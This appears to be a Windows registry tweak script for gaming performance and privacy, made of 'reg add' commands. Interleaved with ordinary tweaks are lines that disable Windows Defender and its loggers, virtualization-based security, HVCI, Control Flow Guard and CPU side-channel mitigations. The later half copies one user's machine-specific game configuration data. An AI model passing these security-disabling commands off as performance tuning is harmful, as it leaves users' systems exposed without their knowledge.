reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "FlipNoVsync" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "SoftwareOnly" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "DpiMapIommuContiguous" /t REG_DWORD /d "1" /f 
reg add "HKCU\Software\Piriform\CCleaner" /v "Monitoring" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Piriform\CCleaner" /v "HelpImproveCCleaner" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Piriform\CCleaner" /v "SystemMonitoring" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Piriform\CCleaner" /v "UpdateAuto" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Piriform\CCleaner" /v "UpdateCheck" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Piriform\CCleaner" /v "CheckTrialOffer" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)HealthCheck" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)QuickClean" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)QuickCleanIpm" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)GetIpmForTrial" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)SoftwareUpdater" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Piriform\CCleaner" /v "(Cfg)SoftwareUpdaterIpm" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxTagPerApplication" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "DisableTaggedEnergyLogging" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxApplication" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\WMDRM" /v "DisableOnline" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Browser" /v "AllowAddressBarDropdown" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Privacy" /v "EnableEncryptedMediaExtensions" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d "5" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\AppSync" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\StartLayout" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Speech_OneCore\Preferences" /v "ModelDownloadAllowed" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "MaxTelemetryAllowed" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechModelUpdate" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t "REG_DWORD" /d "2" /f
reg add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSyncUserOverride" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpyNetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\ScheduledDiagnostics" /v "EnabledExecution" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\OneDrive" /v "PreventNetworkTrafficPreUserSignIn" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowCortana" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowTailoredExperiencesWithDiagnosticData" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "24" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "18" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "High" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Latency Sensitive" /t REG_SZ /d "True" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDebugMode" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "6" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PerfCalculateActualUtilization" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "SleepReliabilityDetailedDiagnostics" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "QosManagesIdleProcessors" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableVsyncLatencyUpdate" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableSensorWatchdog" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Input\Settings\ControllerProcessor\CursorSpeed" /v "CursorUpdateInterval" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\DWM" /v "CompositionPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000002000a2aa3fc105db7031bdec104bf4abb2ac2ec9ba61470eaa47e35f70470739000000000e80000000020000200000004c4c9bb247edfba288821848b8a5ac4c179afe56042f12cbbd160f504413172d40000000a37e3ef9d3ecec8d6e0a7c3810ce8fec7dd8a95ff8e32733462e46c510bc9c0c679869e43b9b0a5c5847d7566a480d4c460ff7d091dc9e59cfabf33e18852ed3400000006268d09da61abb457e96064d252ad099ba4e7c6b718221ed28d82b2c4c88af2dada82ff5c82cf409174a6138b36d044dc9ed793a87e11cd91a0f691f2d25842d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "GameDVR_GameGUID" /t REG_SZ /d "9f5addde-641b-47fd-83d4-96631cf0d47d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\008af23d-f4cc-4435-9422-b95fecf4b177" /v "TitleId" /t REG_SZ /d "2121740635" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "Flags" /t REG_DWORD /d "19" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000c2df71fcb3a8c4492d1bdc384d3713b1a06ddec2c98b19f2f557c6301bdf5114000000000e80000000020000200000006b9e52a75ba13e5894355aaa0db627d643467a639c1500ee302380c2a6ca92dc30000000609291d835a39f16c075eb96f99c5c5039e3d2cca33dc0f557542087aa34bd5ad717a4bf87304720e6553aef042ba32c4000000081262c093afc386b8449384dbdb76b8c53f76c8e8e61c2f9354cf43abe84ede38e6b39130f08935e58afb04dd6b7c266bb2f4d21ef6c5b99f707a920e0a95f6d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "GameDVR_GameGUID" /t REG_SZ /d "8bba1d53-2f6d-4275-b42d-61db4def7d51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "TitleId" /t REG_SZ /d "1877036175" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\00e51963-7a20-47e8-86dd-c5061773edad" /v "MatchedExeFullPath" /t REG_SZ /d "C:\Users\pc\AppData\Local\Roblox\Versions\version-5a2a97e1d9794df1\RobloxPlayerBeta.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000031756bbb777d47648941c37eb5679eb5faea718ad1d33a8dffa7cbe1037a2602000000000e8000000002000020000000ce5a17520c298ceb4ad269c435d68303e05e8c732368f36058a8c8579d0f2cdc2000000022f2a35d2e25cef6c4cfab6d189642c1fa0bbb04a4f01b6f26613afc238ea395400000004a03fe735dd356be81dba2c8c6d14dc1f10ae9feb993f375c40ffa0564439546f83b723636dcedcc681bee3373f142bf14b892fc6b3bfba99764893af1a041f1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "ExeParentDirectory" /t REG_SZ /d "Thunder" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\04cc06c9-e532-4b12-a143-77fc1cb3283a" /v "GameDVR_GameGUID" /t REG_SZ /d "0a7b1129-06ec-49b3-b3cb-7bcab1043941" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000002373d4cb829b8d309a4f1bf07c66364bfa41378d31f6f744cc9f7f23ef4e1031000000000e8000000002000020000000a24b64be0c9b8d0f16cbd994639c188f3444951eb6c9bfcb47d8b681fa47b07120000000e38d3fb7a2427b9ccf8037d5a2802d56bd7e898dffb34e4577195c1e3fcf86b4400000009eb26b0a765800ded0f098c87b606bbfc9b3528be71fbb8175b82eeb5cd67738abb1dcacd79a324933f20a7851732fa4c6f1a6d6b4961746f447b9e9fd473a55" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "GameDVR_GameGUID" /t REG_SZ /d "5b0cb2d0-553f-4a2e-bc7a-337f2b827646" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0731122e-f429-4e74-8501-842bc3d88850" /v "TitleId" /t REG_SZ /d "2040962988" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000015e602d1f42285538dacf649daaf7592dca0581750b9107296e7abc37242f06c000000000e8000000002000020000000bb381d1ca94e32652bb70cf995c4bbd2c19f3f49d26f13e9fc9337ebef477169400000001990f6e1858e542b422e89184e9f34f2312d28ed1d2e9723360359e8de3ac62865b00e1850b3c22c7bce0768d1e4a46bc2fe733bef6dec93f1411d9699ecef0c40000000423459ded360714b12ef18939ab130e05218cad9db83b975d48d43f02e50702d5e72a47c23cc1a6384247c7e13e81e48370524883224f3507b282547c5fdeb39" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "GameDVR_GameGUID" /t REG_SZ /d "5415bfb2-a9e9-4a8c-bcbd-4d1d9a066d3b" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "TitleId" /t REG_SZ /d "1742142364" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0a956050-9628-4220-b516-808e497417c6" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000a7e4efc94492c124758db5e8d7f5b3506a9cad55309cecd340d1809f28f66ce4000000000e8000000002000020000000fbe13cd1ba843a295fc8ce9f1f8d24c798ac4c064d59b161a12a98d133dc0a6b5000000077a46e8ac62ed853f6ab669b720e9db5247d6ffe4b7f4d7b1143aba453e87b72563b737d481adeb48a6b2cc7114e1b14c71775a55bbd5490a2b804715069895257e67c009df44896a0ac430054c2abc5400000001c39f03041e17283c4f3b4607d4e2e86f1697d4b45830c7413d084bfc81c6ca5470a72c84737c44b659028763d95b9e75cb89a78e7eaca94db9edaa358c31d28" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "GameDVR_GameGUID" /t REG_SZ /d "284ea1b3-f5e7-4133-b521-74a8d9ae997e" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "TitleId" /t REG_SZ /d "1820250788" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\0f715c27-e790-401f-b0a4-58a636f50f48" /v "MatchedExeFullPath" /t REG_SZ /d "E:\fORTNITE\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000645d20b00299a5ec1ec1ea07a8c46ff1fced90efadac97b15f127f059499360c000000000e8000000002000020000000efa25878be8c0e928864cc2e6dea1d8ee7232416c6131c1e8f09b76c9a023cf7200000001bffe4cafc21b93e79b6d96b2c0b1c4c4c4707c7b5570eea449aba66a99951f44000000047b0cc43987ee5631ebd08041ecce1ae0671c247c6d9a0ef546d45a6f549027b7e9a580271278a5386db42c817c2adac9b9c5f744974a67b4f9752ecda3f9559" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "ExeParentDirectory" /t REG_SZ /d "assettocorsa" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "GameDVR_GameGUID" /t REG_SZ /d "504b718c-a940-4c74-a033-a1a8ae2214b7" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\11163eb8-ff97-4fc8-a4d1-1d46c9565579" /v "TitleId" /t REG_SZ /d "1732322725" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000812f71d40c69942ad2801687683e9b9fea1a51b8c518e2fa9b2d028bb455a4d4000000000e8000000002000020000000cbfe4aae72d069e43f20f336242fa53a9dd7c50c137349bb22ef32764c61a46330000000ad8cbc9f66d19470cd21556902c384e16235b6afc00f8b77b94171d411962392e527219838c20f77fdf50d48134eb5b740000000a20940b64d97a2d58c8904f51e8695b6cabf86f9a98fc022999620e11264c52d272e845533f8b52ff0e52b5733185ec97ddcd8a163126075e7c2a5e290253aba" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "GameDVR_GameGUID" /t REG_SZ /d "2605801a-c442-492c-8f9e-b274878c9c77" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\241e0838-282a-453c-bf0c-b453987e7fa3" /v "TitleId" /t REG_SZ /d "1918679142" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "Flags" /t REG_DWORD /d "51" /f
